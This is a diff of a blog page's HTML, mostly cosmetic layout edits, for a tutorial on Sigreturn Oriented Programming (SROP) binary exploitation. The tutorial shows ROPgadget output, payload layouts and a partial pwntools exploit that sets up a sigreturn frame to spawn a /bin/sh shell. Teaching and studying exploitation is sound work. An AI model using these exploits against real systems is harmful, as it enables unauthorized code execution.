@@ -9,6 +9,13 @@
 <meta name="keywords" content=", exploit, SROP" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+
 <link rel="canonical" href="https://Rog3rSm1th.github.io/posts/sigreturn-oriented-programming/" />
 
 
@@ -20,12 +27,12 @@
 
 
 
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
-    type="text/css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" integrity="sha512-Cv93isQdFwaKBV+Z4X8kaVBYWHST58Xb/jVOcV9aRsGSArZsgAnFIhMpDoMDcFNoUtday1hdjn0nGp3+KZyyFw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 
 
 
-<link rel="stylesheet" href="/main.0fae95e8636ac05c5c5dd0fb61693954217f3f35992751e1626888c6ea2163ad.css">
+<link rel="stylesheet" href="/main.9a489d9dd56af0a4e1445a31db016289012e1d822abbfc4ffb6f279f501713a9.css" integrity="sha256-mkidndVq8KThRFox2wFiiQEuHYIqu/xP&#43;28nn1AXE6k=">
 
 
 
@@ -39,10 +46,16 @@
 
 
 <meta itemprop="name" content="Exploit a binary with SigReturn Oriented Programming (SROP)">
-<meta itemprop="description" content="Some cool techniques you can use to create SROP exploits"><meta itemprop="datePublished" content="2021-06-10T00:00:00+00:00" />
+<meta itemprop="description" content="Some cool techniques you can use to create SROP exploits">
+<meta itemprop="datePublished" content="2021-06-10T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2021-06-10T00:00:00+00:00" />
-<meta itemprop="wordCount" content="1200"><meta itemprop="image" content="https://Rog3rSm1th.github.io/"/>
+<meta itemprop="wordCount" content="1222">
+<meta itemprop="image" content="https://Rog3rSm1th.github.io/"/>
+
+
+
 <meta itemprop="keywords" content="exploit,SROP," />
+
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://Rog3rSm1th.github.io/"/>
 
@@ -51,14 +64,13 @@
 
 
 
-
     <meta property="og:title" content="Exploit a binary with SigReturn Oriented Programming (SROP)" />
 <meta property="og:description" content="Some cool techniques you can use to create SROP exploits" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://Rog3rSm1th.github.io/posts/sigreturn-oriented-programming/" /><meta property="og:image" content="https://Rog3rSm1th.github.io/"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://Rog3rSm1th.github.io/posts/sigreturn-oriented-programming/" />
+<meta property="og:image" content="https://Rog3rSm1th.github.io/"/>
 <meta property="article:published_time" content="2021-06-10T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-06-10T00:00:00+00:00" /><meta property="og:site_name" content="Rog3rSm1th" />
-
 
 
 
@@ -68,6 +80,8 @@
 
 
     <meta property="article:published_time" content="2021-06-10 00:00:00 &#43;0000 UTC" />
+
+
 
 
 
@@ -91,7 +105,8 @@
     <div class="logo">
         
             <span class="logo__mark">></span>
-            <span class="logo__text">Rog3rSm1th @ blog</span>
+            <span class="logo__text ">
+                rog3rsm1th</span>
             <span class="logo__cursor" style=
                   "
                    
@@ -105,7 +120,7 @@
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/posts">Blog</a></li>
+    <ul class="menu__inner"><li><a href="/about">about</a></li><li><a href="/posts">blog</a></li><li><a href="/contact">contact</a></li>
     </ul>
 </nav>
 
@@ -152,26 +167,37 @@
 
       <div class="post-content">
         <blockquote>
-<p><em>I wrote this article in order to synthesize the different methods I have encountered to exploit a binary with SROP, it is also a preparatory work for the development of a tool allowing to automatically search in a binary the elements useful to the creation of a SROP exploit.</em></p>
+<p><em>If you&rsquo;re interested in binary exploitation, you may have heard of SROP (Sigreturn Oriented Programming), a technique that leverages a program&rsquo;s signal handling mechanism to gain control over its execution flow. In this article, we&rsquo;ll explore different methods to exploit a binary with SROP, and discuss a tool that can automate the process of finding the necessary elements for a successful SROP exploit.</em></p>
 </blockquote>
 <p>Since its first presentation at the 35th <em>Security and Privacy IEEE conference</em> in 2014, the <em>SROP</em> method has been the subject of several papers, as well as numerous CTF challenges, however, it remains difficult to find a comprehensive paper on this topic, so this will be the focus of this article.</p>
 <p>We will cover (probably not exhaustively) the different ways that can be used to exploit a <code>x64/x86</code> binary using the <em>SROP</em> method.</p>
 <ol>
-<li><a href="#how-does-it-works">How does it works?</a></li>
-<li><a href="#why-using-this-technique">Why using this technique?</a></li>
-<li><a href="#the-different-ways-to-set-the-eax-register-to-0xf">The different ways to set the eax register to 0xf</a></li>
-<li><a href="#exemples-of-custom-sigcontexts">Exemples of custom sigcontexts</a></li>
+<li><a href="#-how-does-it-works">How does it works?</a></li>
+<li><a href="#-why-using-this-technique">Why using this technique?</a></li>
+<li><a href="#-the-different-ways-to-set-the-eax-register-to-0xf">The different ways to set the eax register to 0xf</a></li>
+<li><a href="#-exemples-of-custom-sigcontexts">Exemples of custom sigcontexts</a></li>
 </ol>
-<h2 id="how-does-it-works">How does it works?</h2>
+<h4 id="-how-does-it-works">🧐 How does it works?</h4>
 <p>In order to understand how <em>SROP</em> works, we must first understand what happens when a <em>signal</em> occurs in a Unix-like system.</p>
 <p>Signals are not the subject of this article, but you can find what you need to understand the following <a href="https://en.wikipedia.org/wiki/Signal_(IPC)">here</a></p>
-<h4 id="what-happens-when-a-signal-occurs">What happens when a signal occurs:</h4>
+<h4 id="-what-happens-when-a-signal-occurs">📡 What happens when a signal occurs:</h4>
 <ul>
 <li>the execution of the process will be paused by the <em>kernel</em> in order to jump to a routine that will handle the signal.</li>
 <li>In order to safely resume execution after the handler, the context of this process is pushed to be saved on the <em>stack</em> (registers, flags, instruction pointer, stack pointer&hellip;).
 the context takes the form of a &ldquo;sigcontext&rdquo; structure whose details can be found <a href="https://github.com/torvalds/linux/blob/master/arch/x86/include/uapi/asm/sigcontext.h">here</a></li>
 </ul>
-<p><img src="https://i.imgur.com/I0R0bJx.png#center" alt=""></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img src="https://i.imgur.com/I0R0bJx.png#center" alt=""></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">sigcontext</td>
+</tr>
+</tbody>
+</table>
 <ul>
 <li><code>sigreturn()</code> is called once the handler is finished. the process context is restored from the stack and the stack values are removed.</li>
 </ul>
@@ -183,19 +209,19 @@ the context takes the form of a &ldquo;sigcontext&rdquo; structure whose details
 <li>A way to put the value <code>0xf</code> into the <code>eax</code> register</li>
 <li>a <code>syscall; ret</code> gagdet</li>
 </ul>
-<h2 id="why-using-this-technique">Why using this technique?</h2>
+<h4 id="-why-using-this-technique">🤔 Why using this technique?</h4>
 <ul>
 <li>This method allows to build an exploit with a very limited number of gagdets (<em>ROP</em>)</li>
 <li>It&rsquo;s much easier to control the execution context (<em>registers</em> status) than with a classical <em>ROP</em></li>
 <li><em>SROP</em> exploits are usually portable across different binaries with minimal or no effort and allow easily setting the contents of the <em>registers</em></li>
 <li>Because we can 😉</li>
 </ul>
-<h2 id="the-different-ways-to-set-the-eax-register-to-0xf">The different ways to set the <code>eax</code> register to <code>0xf</code></h2>
-<h3 id="the-trivial-case-we-have-a-mov-eax-0xf-gagdet">The trivial case: we have a <code>mov eax, 0xf</code> gagdet</h3>
+<h4 id="-the-different-ways-to-set-the-eax-register-to-0xf">🔍 The different ways to set the <code>eax</code> register to <code>0xf</code></h4>
+<h5 id="the-trivial-case-we-have-a-mov-eax-0xf-gagdet">The trivial case: we have a <code>mov eax, 0xf</code> gagdet</h5>
 <p>the case where this gadget is present in the binary is the simplest to exploit, since it will allow us to place <code>0xf</code> into the eax register in a single action, no need to chain <em>ROP gadgets</em>.</p>
 <p>➡ <strong>Exemple</strong> :</p>
 <p>We start by searching the different <em>ROP gadgets</em> present in the binary with the <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> tool</p>
-<pre tabindex="0"><code>    $ ~ ROPgadget --binary trivial
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">    $ ~ ROPgadget --binary trivial
     Gadgets information
     ============================================================
     [...]
@@ -203,7 +229,7 @@ the context takes the form of a &ldquo;sigcontext&rdquo; structure whose details
     [...]
     0x0000000000001143 : mov eax, 0xf ; ret
     [...]
-</code></pre><p>With these two <em>gadgets</em>, building an exploit becomes very simple</p>
+</code></pre></div><p>With these two <em>gadgets</em>, building an exploit becomes very simple</p>
 <p>Here is the structure of our exploit.</p>
 <table>
 <thead>
@@ -226,10 +252,10 @@ the context takes the form of a &ldquo;sigcontext&rdquo; structure whose details
 </tr>
 </tbody>
 </table>
-<h3 id="using-thepop-eax-ret-gadget">Using the<code>pop eax; ret</code> gadget</h3>
+<h5 id="using-thepop-eax-ret-gadget">Using the<code>pop eax; ret</code> gadget</h5>
 <p>This case is a &ldquo;variant&rdquo; of the previous one where it is still rather simple to put the value <code>0xf</code> in the <code>eax</code> register</p>
-<p>➡ <strong>Exemple</strong> :</p>
-<pre tabindex="0"><code>    $ ~ ROPgadget --binary pop_eax
+<p>➡ <strong>Example</strong> :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">    $ ~ ROPgadget --binary pop_eax
     Gadgets information
     ============================================================
     [...]
@@ -237,7 +263,7 @@ the context takes the form of a &ldquo;sigcontext&rdquo; structure whose details
     [...]
     0x0000000000401020 : pop eax ; ret
     [...]
-</code></pre><p>Here is the structure of our exploit.</p>
+</code></pre></div><p>Here is the structure of our exploit.</p>
 <table>
 <thead>
 <tr>
@@ -263,7 +289,7 @@ the context takes the form of a &ldquo;sigcontext&rdquo; structure whose details
 </tbody>
 </table>
 <p>example of a python exploit by <a href="https://github.com/mishrasunny174">mishrasunny174</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
 offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x48</span>
@@ -284,10 +310,10 @@ payload <span style="color:#f92672">+=</span> str(frame)
 p<span style="color:#f92672">.</span>sendline(payload)
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><p>The author of the exploit uses the presence of the string <code>/bin/sh</code> in the binary by passing it as a parameter to the <code>execve</code> function via the <code>rdi</code> register, but it is obviously possible to use many other methods.</p>
-<h3 id="use-the-read-syscall-to-set-the-eax-register-to-0xf">Use the <code>read</code> syscall to set the <code>eax</code> register to <code>0xf</code></h3>
+<h5 id="use-the-read-syscall-to-set-the-eax-register-to-0xf">Use the <code>read</code> syscall to set the <code>eax</code> register to <code>0xf</code></h5>
 <p>An interesting thing to know is that the <code>read</code> syscall records the number of bytes read into the <code>eax</code> register.</p>
 <p>There are two methods to set the value <code>0xf</code> in eax using the <code>read</code> syscall:</p>
-<h4 id="using-the-mov-eax-0x0-gadget">Using the <code>mov eax, 0x0</code> gadget</h4>
+<h5 id="using-the-mov-eax-0x0-gadget">Using the <code>mov eax, 0x0</code> gadget</h5>
 <table>
 <thead>
 <tr>
@@ -323,7 +349,7 @@ p<span style="color:#f92672">.</span>interactive()
 </tr>
 </tbody>
 </table>
-<h4 id="using-the-pop-eax-gadget">Using the <code>pop eax</code> gadget</h4>
+<h5 id="using-the-pop-eax-gadget">Using the <code>pop eax</code> gadget</h5>
 <table>
 <thead>
 <tr>
@@ -362,9 +388,9 @@ p<span style="color:#f92672">.</span>interactive()
 </tr>
 </tbody>
 </table>
-<h2 id="exemples-of-custom-sigcontexts">Exemples of custom sigcontexts</h2>
+<h4 id="-exemples-of-custom-sigcontexts">🪧 Exemples of custom sigcontexts</h4>
 <p>Once you have figured out how to call the <code>sigreturn</code> syscall, you need to figure out how to get a <strong>shell</strong> through the context that will be restored from the stack.</p>
-<h4 id="if-the-binary-contains-the-binsh-string">If the binary contains the <code>/bin/sh</code> string</h4>
+<h5 id="if-the-binary-contains-the-binsh-string">If the binary contains the <code>/bin/sh</code> string</h5>
 <p>The idea is to call the <code>execve</code> function ( syscall <code>0x3b</code> -&gt; 59 in decimal ) with the string <code>/bin/sh</code> as parameter which will give us a shell. The string <code>/bin/sh</code> can either be present in the binary or you can write it in a memory area whose you know the address.</p>
 <table>
 <thead>
@@ -396,7 +422,7 @@ p<span style="color:#f92672">.</span>interactive()
 </tr>
 </tbody>
 </table>
-<h4 id="use-mprotect">Use <code>mprotect</code></h4>
+<h5 id="use-mprotect">Use <code>mprotect</code></h5>
 <blockquote>
 <p><strong>mprotect</strong> : set protection on a region of memory</p>
 </blockquote>
@@ -435,13 +461,13 @@ p<span style="color:#f92672">.</span>interactive()
 </tr>
 </tbody>
 </table>
-<h2 id="to-go-further">To go further</h2>
+<h4 id="-to-go-further">⬇️ To go further</h4>
 <ul>
 <li><a href="https://en.wikipedia.org/wiki/Sigreturn-oriented_programming">Wikipedia article about SROP</a></li>
 <li><a href="https://hackmd.io/@imth/SROP">A write-Up for the Minipwn challenge from the 2019 TheManyHatsClub CTF</a></li>
 <li><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=6956568">Article from Erik Bosman</a></li>
 </ul>
-<h3 id="thanks-for-reading">Thanks for reading!</h3>
+<h3 id="-thanks-for-reading">🤟 Thanks for reading!</h3>
 <p>for more informations or suggestions, you can contact me at : <a href="mailto:r0g3r5@protonmail.com">r0g3r5@protonmail.com</a>, or on twitter at <a href="https://twitter.com/Rog3rSm1th">@Rog3rSm1th</a></p>
 
       </div>
@@ -476,7 +502,7 @@ p<span style="color:#f92672">.</span>interactive()
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1200 Words
+        1222 Words
       </p>
 
       <p>
@@ -609,6 +635,13 @@ p<span style="color:#f92672">.</span>interactive()
             
 
             
+            <span class="button next">
+                <a href="https://Rog3rSm1th.github.io/posts/polyglot-of-code/">
+                    <span class="button__text">Solving Advent of code, but with a different programming language for each day !</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
         </div>
     </div>
 
@@ -634,7 +667,7 @@ p<span style="color:#f92672">.</span>interactive()
 
 
 
-<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+<script type="text/javascript" src="/bundle.min.97a8045a726eccf303b74163251eb214dcb8fce3e0eaddb67866dc97cd45bb5954e4edd26e063cf1b285743e3331ab3a31a0ba5703b1fced4a406fc7b7205eb3.js" integrity="sha512-l6gEWnJuzPMDt0FjJR6yFNy4/OPg6t22eGbcl81Fu1lU5O3SbgY88bKFdD4zMas6MaC6VwOx/O1KQG/HtyBesw=="></script>
 
 
 
